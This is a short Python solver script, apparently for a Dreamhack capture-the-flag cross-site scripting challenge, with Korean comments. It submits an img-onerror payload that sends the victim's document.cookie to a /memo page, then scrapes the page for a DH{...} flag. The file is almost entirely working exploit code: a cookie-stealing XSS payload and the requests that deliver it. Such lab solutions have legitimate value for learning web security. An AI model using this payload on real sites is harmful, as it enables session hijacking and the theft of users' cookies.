import re
from requests import request as req

# 쿠키의 값을 읽어와 /memo에 요청하는 스크립트
script = "<img src='x' onerror='location.href='/memo?memo=' + document.cookie'>"
url = "http://host3.dreamhack.games:24081"

# /flag 요청
res_flag = req(
    method="POST",
    url=f"{url}/flag",
    data={"param": script},
)

if not res_flag.status_code == 200:
    raise Exception("ERROR")

# /memo 확인
res_memo = req(
    method="GET",
    url=f"{url}/memo",
)

# flag 필터링
match = re.search("DH{.*}", res_memo.text)

print(match.group() if match else "NO FLAG")
